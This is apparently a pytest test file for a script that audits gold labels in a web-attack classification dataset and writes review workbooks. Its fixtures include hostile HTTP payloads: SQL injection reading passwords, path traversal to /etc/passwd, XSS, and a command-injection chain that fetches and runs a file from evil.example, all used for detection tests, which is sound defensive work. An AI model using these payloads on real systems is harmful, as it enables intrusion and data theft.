from pathlib import Path

import pytest
from openpyxl import Workbook, load_workbook

from scripts.review_task_107_labels import analyze_row, review_workbook


def test_no_label_with_union_select_is_high_confidence_yes():
    result = analyze_row(
        payload=(
            "GET /search?id=1%20UNION%20SELECT%20username,password"
            "%20FROM%20users HTTP/1.1"
        ),
        gold="No",
        model_output="Yes",
    )

    assert result["建议标签"] == "Yes"
    assert result["错标嫌疑等级"] == "高错标嫌疑"
    assert "SQL注入" in result["规则类别"]


def test_double_encoded_path_traversal_is_detected():
    result = analyze_row(
        payload=(
            "GET /download?file=%252e%252e%252f%252e%252e"
            "%252fetc%252fpasswd HTTP/1.1"
        ),
        gold="No",
        model_output="Yes",
    )

    assert result["建议标签"] == "Yes"
    assert result["错标嫌疑等级"] == "高错标嫌疑"
    assert "路径遍历/文件包含" in result["规则类别"]


def test_command_download_execution_chain_is_detected():
    result = analyze_row(
        payload=(
            "POST /run HTTP/1.1\n\n"
            "cmd=wget http://evil.example/a -O /tmp/a; "
            "chmod +x /tmp/a; /tmp/a"
        ),
        gold="No",
        model_output="Yes",
    )

    assert result["建议标签"] == "Yes"
    assert "命令注入/代码执行" in result["规则类别"]


def test_random_backtick_noise_does_not_trigger_strong_shell_rule():
    result = analyze_row(
        payload=(
            "GET /binary HTTP/1.1\n"
            "X-Noise: abc`.y$e....x...>.d=.......s..q........!...1...`xyz"
        ),
        gold="No",
        model_output="Yes",
    )

    assert result["建议标签"] == ""
    assert "命令注入/代码执行" not in result["规则类别"]


def test_normal_request_is_not_suggested_as_attack():
    result = analyze_row(
        payload="GET /assets/main.css HTTP/1.1\nHost: example.com",
        gold="No",
        model_output="Yes",
    )

    assert result["建议标签"] == ""
    assert result["错标嫌疑等级"] == "规则未发现错标证据"
    assert result["风险分"] == 0


def test_yes_without_rule_hit_is_review_only_not_auto_no():
    result = analyze_row(
        payload="CONNECT 20.65.2.12:1706 HTTP/1.1",
        gold="Yes",
        model_output="No",
    )

    assert result["建议标签"] != "No"
    assert result["错标嫌疑等级"] in {"中错标嫌疑", "低错标嫌疑"}


def test_yes_with_no_rule_hit_remains_low_confidence_review_only():
    result = analyze_row(
        payload="GET /assets/main.css HTTP/1.1\nHost: example.com",
        gold="Yes",
        model_output="No",
    )

    assert result["建议标签"] == ""
    assert result["错标嫌疑等级"] == "低错标嫌疑"


def test_no_with_only_medium_evidence_is_not_suggested_as_yes():
    result = analyze_row(
        payload="CONNECT 20.65.2.12:1706 HTTP/1.1",
        gold="No",
        model_output="Yes",
    )

    assert result["建议标签"] == ""
    assert result["错标嫌疑等级"] != "高错标嫌疑"


@pytest.mark.parametrize(
    "payload",
    [
        "GET /docs?example=javascript:alert(1) HTTP/1.1",
        "POST /code HTTP/1.1\n\nsnippet=eval(user_input)",
    ],
)
def test_isolated_code_keywords_are_not_strong_attack_evidence(payload):
    result = analyze_row(payload=payload, gold="No", model_output="Yes")

    assert result["建议标签"] == ""
    assert result["错标嫌疑等级"] != "高错标嫌疑"


def test_case_sensitive_java_serialization_signature():
    exact = analyze_row(
        payload="POST /deserialize HTTP/1.1\n\nrO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
        gold="No",
        model_output="Yes",
    )
    wrong_case = analyze_row(
        payload="POST /deserialize HTTP/1.1\n\nro0abxnyabfqyxzhlavutglwsgfzse1hca==",
        gold="No",
        model_output="Yes",
    )

    assert exact["建议标签"] == "Yes"
    assert "JNDI/反序列化/XXE" in exact["规则类别"]
    assert wrong_case["建议标签"] == ""


def test_decoded_view_matches_rule_only_once():
    result = analyze_row(
        payload="GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1",
        gold="No",
        model_output="Yes",
    )

    assert result["建议标签"] == "Yes"
    assert result["风险分"] == 6
    assert result["命中证据"].count("XSS_EXECUTION") == 1


def test_verbose_answer_is_normalized_as_other():
    result = analyze_row(
        payload="GET / HTTP/1.1",
        gold="Yes",
        model_output="The answer is Yes because this is suspicious.",
    )

    assert result["规范化模型输出"] == "Other"


def _write_fixture_workbook(path: Path, include_model_output: bool = True) -> None:
    workbook = Workbook()
    sheet = workbook.active
    headers = ["payload", "标记"]
    if include_model_output:
        headers.append("模型输出")
    headers.append("提示词")
    sheet.append(headers)

    rows = [
        (
            "GET /?id=1 UNION SELECT password FROM users HTTP/1.1",
            "No",
            "Yes",
            "system prompt mentions web attack",
        ),
        (
            "GET /assets/main.css HTTP/1.1",
            "No",
            "Yes",
            "system prompt mentions web attack",
        ),
        (
            "CONNECT 20.65.2.12:1706 HTTP/1.1",
            "Yes",
            "No",
            "system prompt mentions web attack",
        ),
    ]
    for payload, gold, model_output, prompt in rows:
        values = [payload, gold]
        if include_model_output:
            values.append(model_output)
        values.append(prompt)
        sheet.append(values)
    workbook.save(path)


def test_review_workbook_creates_three_consistent_sheets(tmp_path):
    source = tmp_path / "input.xlsx"
    output = tmp_path / "output.xlsx"
    _write_fixture_workbook(source)

    stats = review_workbook(source, output)

    workbook = load_workbook(output, read_only=True, data_only=True)
    assert workbook.sheetnames == [
        "全部错误_规则分析",
        "高错标嫌疑",
        "规则汇总",
    ]
    assert workbook["全部错误_规则分析"].max_row == 4
    assert workbook["高错标嫌疑"].max_row == 2
    assert stats["input_rows"] == 3
    assert stats["high_confidence"] == 1

    all_headers = [
        cell.value
        for cell in next(
            workbook["全部错误_规则分析"].iter_rows(min_row=1, max_row=1)
        )
    ]
    assert all_headers[:4] == ["payload", "标记", "模型输出", "提示词"]
    assert "判断说明" in all_headers
    all_rows = list(
        workbook["全部错误_规则分析"].iter_rows(min_row=2, values_only=True)
    )
    assert all_rows[0][:4] == (
        "GET /?id=1 UNION SELECT password FROM users HTTP/1.1",
        "No",
        "Yes",
        "system prompt mentions web attack",
    )


def test_review_workbook_rejects_missing_required_column(tmp_path):
    source = tmp_path / "input.xlsx"
    output = tmp_path / "output.xlsx"
    _write_fixture_workbook(source, include_model_output=False)

    with pytest.raises(ValueError, match="缺少必需列"):
        review_workbook(source, output)

    assert not output.exists()


def test_review_workbook_rejects_same_input_and_output_path(tmp_path):
    source = tmp_path / "input.xlsx"
    _write_fixture_workbook(source)
    original = source.read_bytes()

    with pytest.raises(ValueError, match="不能相同"):
        review_workbook(source, source)

    assert source.read_bytes() == original


def test_review_workbook_preserves_formula_cells(tmp_path):
    source = tmp_path / "input.xlsx"
    output = tmp_path / "output.xlsx"
    _write_fixture_workbook(source)
    workbook = load_workbook(source)
    sheet = workbook.active
    sheet["D2"] = '="prompt-"&A2'
    workbook.save(source)

    review_workbook(source, output)

    reviewed = load_workbook(output, read_only=True, data_only=False)
    value = reviewed["全部错误_规则分析"]["D2"].value
    assert value == '="prompt-"&A2'


def test_review_workbook_rejects_duplicate_or_conflicting_headers(tmp_path):
    for headers in (
        ["payload", "标记", "模型输出", "payload"],
        ["payload", "标记", "模型输出", "风险分"],
    ):
        source = tmp_path / f"input-{len(headers)}-{headers[-1]}.xlsx"
        output = tmp_path / f"output-{len(headers)}-{headers[-1]}.xlsx"
        workbook = Workbook()
        sheet = workbook.active
        sheet.append(headers)
        sheet.append(["GET / HTTP/1.1", "No", "Yes", "value"])
        workbook.save(source)

        with pytest.raises(ValueError, match="表头"):
            review_workbook(source, output)

        assert not output.exists()
